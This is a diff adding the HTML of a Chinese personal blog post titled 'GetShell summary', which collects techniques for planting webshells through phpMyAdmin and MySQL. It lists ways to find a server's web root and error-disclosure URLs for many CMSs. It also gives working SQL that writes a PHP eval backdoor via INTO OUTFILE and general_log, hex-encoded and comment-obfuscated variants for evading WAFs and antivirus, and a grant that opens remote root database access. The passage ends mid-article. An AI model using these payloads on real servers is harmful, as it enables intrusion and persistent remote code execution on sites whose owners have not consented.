@@ -1,0 +1,1446 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="学习总结篇—GetShell, dylan&#39;s blog">
+    <meta name="description" content="0x00 前言各种GetShell总结
+0x01 phpMyAdmin GetShell网站路径信息获取找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，而Document Roo">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>学习总结篇—GetShell | dylan&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">dylan's blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">dylan's blog</div>
+        <div class="logo-desc">
+            
+            心若在，梦就在。
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/dylan903/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/dylan903/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '9f77c4517ffa5375fb7f06c0209facae53fd5e4b7b88986eb0c11591810b2dbe';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('Being their worst nightmare！')).toString(CryptoJS.enc.Hex)) {
+                alert('Error！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        学习总结篇—GetShell
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/GetShell/" target="_blank">
+                                <span class="chip bg-color">GetShell</span>
+                            </a>
+                        
+                            <a href="/tags/summary/" target="_blank">
+                                <span class="chip bg-color">summary</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/summary/" class="post-category" target="_blank">
+                                summary
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-11-20
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.8k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        12 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>各种GetShell总结</p>
+<h1 id="0x01-phpMyAdmin-GetShell"><a href="#0x01-phpMyAdmin-GetShell" class="headerlink" title="0x01 phpMyAdmin GetShell"></a>0x01 phpMyAdmin GetShell</h1><h2 id="网站路径信息获取"><a href="#网站路径信息获取" class="headerlink" title="网站路径信息获取"></a>网站路径信息获取</h2><p>找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，<br>而Document Root最常见的地方就是 phpinfo.php页面和httpd.conf配置文件中；</p>
+<h3 id="phpinfo获取网站路径"><a href="#phpinfo获取网站路径" class="headerlink" title="phpinfo获取网站路径"></a>phpinfo获取网站路径</h3><h4 id="收集网站部署使用的套件信息"><a href="#收集网站部署使用的套件信息" class="headerlink" title="收集网站部署使用的套件信息"></a>收集网站部署使用的套件信息</h4><p>常见未删除phpinfo页面</p>
+<ul>
+<li>phpinfo.php</li>
+<li>info.php</li>
+<li>1.php</li>
+<li>test.php</li>
+</ul>
+<p>常见未删除探针页面</p>
+<ul>
+<li>l.php</li>
+<li>p.php</li>
+<li>tanzhen.php</li>
+<li>tz.php</li>
+<li>u.php</li>
+</ul>
+<p>常见未删除测试文件</p>
+<ul>
+<li>test.php</li>
+<li>ceshi.php</li>
+<li>info.php</li>
+<li>phpinfo.php</li>
+<li>php_info.php</li>
+<li>1.php</li>
+</ul>
+<h4 id="爬行遍历收集"><a href="#爬行遍历收集" class="headerlink" title="爬行遍历收集"></a>爬行遍历收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p>
+<h4 id="爆破扫描收集"><a href="#爆破扫描收集" class="headerlink" title="爆破扫描收集"></a>爆破扫描收集</h4><p>通过web扫描器，进行爬虫爬行遍历网站的所有链接，<br>收集可能存在的phpinfo类似的页面，收集网站物理路径信息。</p>
+<h3 id="Google语法爆路径"><a href="#Google语法爆路径" class="headerlink" title="Google语法爆路径"></a>Google语法爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。<br>注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
+<pre><code>Site:xxx.edu.tw warning
+Site:xxx.com.tw “fatal error”</code></pre><h3 id="配置文件读取网站路径"><a href="#配置文件读取网站路径" class="headerlink" title="配置文件读取网站路径"></a>配置文件读取网站路径</h3><p>关键字：<strong>web套件配置文件默认路径</strong></p>
+<p> <code>load_file()</code>函数读取配置文件<br><strong>读取配置文件httpd.conf 或vhosts.conf！！！</strong></p>
+<p>通过常用的web容器套件，来获取默认的网站可写路径信息，<br>如常用套件：xampp、phpnow、phpstudy等。</p>
+<h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>在通过web套件已经猜解到网站的默认路径后，经常会遇到向套件默认目录写入一句话后，无法成功的情况。</p>
+<ul>
+<li><p>情况一：<br>一句话写入成功，但是此目录并不是渗透对象的网站根目录，<br>我们无法通过URL地址访问到“我们写入的一句话木马”；</p>
+</li>
+<li><p>情况二：<br>还有一种情况，就是对于套件默认路径，我们没有写入的权限。<br>最常见的案例就是，我们渗透的网站服务器的系统是linux主机，而没有写入权限。</p>
+</li>
+</ul>
+<ul>
+<li>情况三：<br>再有一种情况就是，目标站点有相应的安全防护如杀毒软件、安全狗、或者IPS、WAF一类的应用防护，<br>导致无法成功写入一句话。对于这种有应用防护的原理，基本一致，都是基于特征检测的方式进行安全防护，<br>如单一特征、多特征防护。那么绕过这些安全防护的方法就是使用变种，如对提交内容进行编码混淆或者采用非敏感的函数等，<br>关于木马绕过技术不在文中扩展说明。</li>
+</ul>
+<p>对于以上“情况一”与“情况二”不能写入成功问题的解决思路，需要满足以下两个条件即可完美解决。</p>
+<p><strong>找到可写的网站路径</strong><br><strong>且可写路径为渗透站点的物理路径，能够被正常的URL访问解析`</strong></p>
+<p>而对于要满足以上的条件，最好的办法，就是通过读取web套件中间件的配置文件信息，获取网站的真实物理路径（如：httpd.conf）。<br>如在获知目标站点使用的xampp套件的情况，下我们可以直接利用phpmyadmin有root登录权限的条件下，<br>直接读取默认配置文件httpd.conf，通过配置文件httpd.conf收集到网站的真实物理路径，<br>读取方法：</p>
+<p><code>select load_file(&#39;D:/xampp/apache/conf/httpd.conf&#39;);</code></p>
+<p>查看数据库目录<br><code>Select @@basedir</code><br>或者<br><code>select @@basedir</code></p>
+<h4 id="Xampp套件"><a href="#Xampp套件" class="headerlink" title="Xampp套件"></a>Xampp套件</h4><p>网站默认路径：<br><code>$disk:/xampp/htdocs</code></p>
+<p>其他可写入路径：<br><code>$disk:/xampp/phpmyadmin/</code><br><strong>注：xampp套件phpmyadmin目录如果没删除，也可以尝试直接写入操作；</strong></p>
+<p>猜测默认apache默认配置文件路径，读取配置文件，查找网站根目录和可写目录路径；<br>Apache配置文件默认路径：</p>
+<p>httpd.conf配置文件：<code>$disk:/xampp/apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/xampp/apache/conf/extra/httpd-vhosts.conf</code></p>
+<h4 id="LAMPP套件"><a href="#LAMPP套件" class="headerlink" title="LAMPP套件"></a>LAMPP套件</h4><p>网站默认路径：<br><code>/opt/lampp/htdocs</code></p>
+<p>Apache配置文件默认路径：<br>httpd.conf配置文件：<code>/opt/lampp/etc/httpd.conf</code><br>vhosts.conf虚拟主机：<code>/opt/lampp/etc/extra/httpd-vhosts.conf</code></p>
+<h4 id="phpStudy套件"><a href="#phpStudy套件" class="headerlink" title="phpStudy套件"></a>phpStudy套件</h4><p>网站默认路径:</p>
+<p><code>$disk:/phpstudy/www</code></p>
+<p>Apache配置文件默认路径：</p>
+<p>httpd.conf配置文件：<code>$disk:/phpStudy/Apache/conf/httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:/phpStudy/Apache/conf/extra/httpd-vhosts.conf</code></p>
+<h4 id="phpnow套件"><a href="#phpnow套件" class="headerlink" title="phpnow套件"></a>phpnow套件</h4><p>phpnow套件默认网站路径依据版本不同可能不同，<br>当前使用最新的版本是1.5.6，其默认目录：</p>
+<p><code>$disk:\phpnow-1.5.6\htdocs</code></p>
+<p>Apache配置文件默认路径：</p>
+<p>httpd.conf配置文件：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\httpd.conf</code><br>vhosts.conf虚拟主机：<code>$disk:\PHPnow-1.5.6\Apache-20\conf\extra\vhosts.comf</code></p>
+<h4 id="LNMP套件"><a href="#LNMP套件" class="headerlink" title="LNMP套件"></a>LNMP套件</h4><p>网站默认路径：</p>
+<p><code>/home/wwwroot/default</code></p>
+<h4 id="其他Web容器"><a href="#其他Web容器" class="headerlink" title="其他Web容器"></a>其他Web容器</h4><p>IIS6.0+win2003 配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:/Windows/system32/inetsrv/metabase.xml</code></p>
+<p>IIS7.0+WINDOWS配置文件<br>网站默认路径：<code>$disk:\InetPub\wwwroot</code><br>配置文件默认路径：<code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p>
+<p>Linux:</p>
+<p>配置文件:<br><code>/etc/php.ini php</code><br><code>/etc/httpd/conf.d/php.conf</code><br>配置文件:<br><code>/etc/httpd/conf/httpd.conf Apache</code><br><code>/usr/local/apache/conf/httpd.conf</code><br><code>/usr/local/apache2/conf/httpd.conf</code><br>虚拟目录配置文件:<br><code>/usr/local/apache/conf/extra/httpd-vhosts.conf</code></p>
+<h3 id="错误页面爆网站路径"><a href="#错误页面爆网站路径" class="headerlink" title="错误页面爆网站路径"></a>错误页面爆网站路径</h3><p>特定目录报错！！！</p>
+<h4 id="Phpmyadmin暴路径"><a href="#Phpmyadmin暴路径" class="headerlink" title="Phpmyadmin暴路径"></a>Phpmyadmin暴路径</h4><p>一般在获取phpmyadmin管理页面后，特定的版本访问特点的目录，可以爆出网站的物理路径。</p>
+<ol>
+<li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li>
+<li><code>/phpMyAdmin/index.php?lang[]=1</code></li>
+<li><code>/phpMyAdmin/phpinfo.php</code></li>
+<li><code>/phpmyadmin/themes/darkblue_orange/layout.inc.php</code></li>
+<li><code>/phpmyadmin/libraries/select_lang.lib.php</code></li>
+<li><code>/phpmyadmin/libraries/lect_lang.lib.php</code></li>
+<li><code>/phpmyadmin/libraries/mcrypt.lib.php</code></li>
+</ol>
+<h4 id="SQL注入点暴路径"><a href="#SQL注入点暴路径" class="headerlink" title="SQL注入点暴路径"></a>SQL注入点暴路径</h4><p>对于存在sql注入点的页面，可以尝试“加单引号”或者“构造错误参数”进行网站路径爆错显示。</p>
+<p><code>www.xxx.com/news.php?id=149′</code><br><code>www.xxx.com/researcharchive.php?id=-1</code></p>
+<h4 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h4><p>当我们遇到Web服务器是nginx，且存在文件类型解析漏洞时，可以在图片地址后加<code>/x.php</code>，<br>该图片不但会被当作<code>php</code>文件执行，还有可能爆出物理路径。</p>
+<p><code>www.xyz.com/123.jpg/x.php</code></p>
+<h4 id="DeDeCms"><a href="#DeDeCms" class="headerlink" title="DeDeCms"></a>DeDeCms</h4><pre><code>/member/templets/menulit.php
+/plus/paycenter/alipay/return_url.php
+/plus/paycenter/cbpayment/autoreceive.php
+/paycenter/nps/config_pay_nps.php
+/plus/task/dede-maketimehtml.php
+/plus/task/dede-optimize-table.php
+/plus/task/dede-upcache.php</code></pre><h4 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h4><pre><code>/wp-admin/includes/file.php
+/wp-content/themes/baiaogu-seo/footer.php</code></pre><h4 id="Ecshop商城系统暴路径漏洞文件"><a href="#Ecshop商城系统暴路径漏洞文件" class="headerlink" title="Ecshop商城系统暴路径漏洞文件"></a>Ecshop商城系统暴路径漏洞文件</h4><pre><code>/api/cron.php
+/wap/goods.php
+/temp/compiled/ur_here.lbi.php
+/temp/compiled/pages.lbi.php
+/temp/compiled/user_transaction.dwt.php
+/temp/compiled/history.lbi.php
+/temp/compiled/page_footer.lbi.php
+/temp/compiled/goods.dwt.php
+/temp/compiled/user_clips.dwt.php
+/temp/compiled/goods_article.lbi.php
+/temp/compiled/comments_list.lbi.php
+/temp/compiled/recommend_promotion.lbi.php
+/temp/compiled/search.dwt.php
+/temp/compiled/category_tree.lbi.php
+/temp/compiled/user_passport.dwt.php
+/temp/compiled/promotion_info.lbi.php
+/temp/compiled/user_menu.lbi.php
+/temp/compiled/message.dwt.php
+/temp/compiled/admin/pagefooter.htm.php
+/temp/compiled/admin/page.htm.php
+/temp/compiled/admin/start.htm.php
+/temp/compiled/admin/goods_search.htm.php
+/temp/compiled/admin/index.htm.php
+/temp/compiled/admin/order_list.htm.php
+/temp/compiled/admin/menu.htm.php
+/temp/compiled/admin/login.htm.php
+/temp/compiled/admin/message.htm.php
+/temp/compiled/admin/goods_list.htm.php
+/temp/compiled/admin/pageheader.htm.php
+/temp/compiled/admin/top.htm.php
+/temp/compiled/top10.lbi.php
+/temp/compiled/member_info.lbi.php
+/temp/compiled/bought_goods.lbi.php
+/temp/compiled/goods_related.lbi.php
+/temp/compiled/page_header.lbi.php
+/temp/compiled/goods_script.html.php
+/temp/compiled/index.dwt.php
+/temp/compiled/goods_fittings.lbi.php
+/temp/compiled/myship.dwt.php
+/temp/compiled/brands.lbi.php
+/temp/compiled/help.lbi.php
+/temp/compiled/goods_gallery.lbi.php
+/temp/compiled/comments.lbi.php
+/temp/compiled/myship.lbi.php
+/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
+/includes/modules/cron/auto_manage.php
+/includes/modules/cron/ipdel.php</code></pre><h4 id="Ucenter爆路径"><a href="#Ucenter爆路径" class="headerlink" title="Ucenter爆路径"></a>Ucenter爆路径</h4><p><code>/ucenter/control/admin/db.php</code></p>
+<h4 id="DZbbs"><a href="#DZbbs" class="headerlink" title="DZbbs"></a>DZbbs</h4><p><code>/manyou/admincp.php?my_suffix=%0A%0DTOBY57</code></p>
+<h4 id="Z-blog"><a href="#Z-blog" class="headerlink" title="Z-blog"></a>Z-blog</h4><p><code>/admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php</code></p>
+<h4 id="Php168爆路径"><a href="#Php168爆路径" class="headerlink" title="Php168爆路径"></a>Php168爆路径</h4><pre><code>/admin/inc/hack/count.php?job=list
+/admin/inc/hack/search.php?job=getcode
+/admin/inc/ajax/bencandy.php?job=do
+/cache/MysqlTime.txt</code></pre><p>PHPcms2008-sp4<br>注册用户登陆后访问<br><code>/phpcms/corpandresize/process.php?pic=../images/logo.gif</code></p>
+<h4 id="CMSeasy爆网站路径漏洞"><a href="#CMSeasy爆网站路径漏洞" class="headerlink" title="CMSeasy爆网站路径漏洞"></a>CMSeasy爆网站路径漏洞</h4><p>漏洞出现在menu_top.php这个文件中</p>
+<pre><code>/lib/mods/celive/menu_top.php
+/lib/default/ballot_act.php
+/lib/default/special_act.php</code></pre><h2 id="写入shell方法"><a href="#写入shell方法" class="headerlink" title="写入shell方法"></a>写入shell方法</h2><h3 id="写入条件"><a href="#写入条件" class="headerlink" title="写入条件"></a>写入条件</h3><p><strong>导出WebShell主要条件：</strong></p>
+<ul>
+<li>Root数据库用户（root权限）</li>
+<li>网站绝对路径（确定有写入权限）</li>
+<li>magic_quotes_gpc：Off（关闭）</li>
+</ul>
+<p><strong>导出WebShell其它条件：</strong></p>
+<ul>
+<li>magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\”反斜杠。</li>
+<li>secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。</li>
+<li>file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。</li>
+</ul>
+<p><strong>写入权限</strong><br>查看能否自定义导出文件目录的权限</p>
+<p><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code></p>
+<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/1541693041317.png" alt></p>
+<p>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br>并且这个值是只读变量，只能通过配置文件修改。</p>
+<pre><code>show global variables like &quot;%secure%&quot;;      //查询secure_file_priv配置
+secure_file_prive=null              //不允许导入导出数据到目录
+secure_file_priv=c:\90sec            //允许导入导出数据到指定目录
+secure_file_priv=&#39;&#39;              //允许导入导出数据到任意目录
+secure_file_priv=&quot;/&quot;              //允许导入导出数据到任意目录</code></pre><p>注：<br>在<code>my.ini</code>、<code>my.cnf</code>、<code>mysqld.cnf</code>文件中找到<code>secure_file_prive</code><br>并将其值设置为<code>&quot;&quot;</code>或<code>&quot;/&quot;</code>，重启MySQL服务！</p>
+<h3 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h3><p><strong>创建数据表导出shell</strong></p>
+<pre><code>CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );
+INSERT INTO `mysql`.`shadow9` (`content` ) VALUES (&#39;&lt;?php @eval($_POST[pass]);?&gt;&#39;);
+SELECT `content` FROM `shadow9` INTO OUTFILE &#39;C:\\phpStudy\\WWW\\90sec.php&#39;;
+DROP TABLE IF EXISTS `shadow9`;</code></pre><p> <strong>一句话导出shell</strong></p>
+<pre><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:/phpstudy/www/90sec.php&#39;;  
+select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;c:\\phpstudy\\www\\90sec.php&#39;;
+select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into dumpfile &#39;c:\\phpstudy\\www\\bypass.php&#39;;</code></pre><p><strong>日志备份获取shell</strong></p>
+<pre><code>show global variables like &quot;%genera%&quot;;          //查询general_log配置
+set global general_log=&#39;on&#39;;              //开启general log模式
+SET global general_log_file=&#39;D:/phpStudy/WWW/cmd.php&#39;;    //设置日志文件保存路径
+SELECT &#39;&lt;?php phpinfo();?&gt;&#39;;              //phpinfo()写入日志文件
+set global general_log=&#39;off&#39;;              //关闭general_log模式</code></pre><h3 id="绕过写入"><a href="#绕过写入" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>当有WAF拦截的时候 我们可以尝试外链 这样提交的数据包不被WAF拦截<br><code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; with grant option;     //开启MySQL外链</code><br><code>flush privileges;                      //刷新MySQL系统权限相关表</code></p>
+<p>这里的这些技巧是从别人那边收集过来的 感谢！！！<br>绕过360 （通过内联注释）<br><code>select &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into /*!50001outfile*/ &#39;c:/phpstudy/www/bypass.php&#39;;</code></p>
+<p>绕过网站安全狗&lt;4.0 （通过hex编码）</p>
+<pre><code>select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>绕过安全狗4.0 通过hex编码+内联注释</p>
+<pre><code>/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h3 id="绕过写入-1"><a href="#绕过写入-1" class="headerlink" title="绕过写入"></a>绕过写入</h3><p>绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell<br>以上的三个文件的作用是（执行SQL语句）<br>但是如果被删除了可以通过以下的方法</p>
+<ul>
+<li>token需要</li>
+<li>自己选择一个数据库和数据表</li>
+<li>参数pos=0</li>
+</ul>
+<pre><code>&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>例如</p>
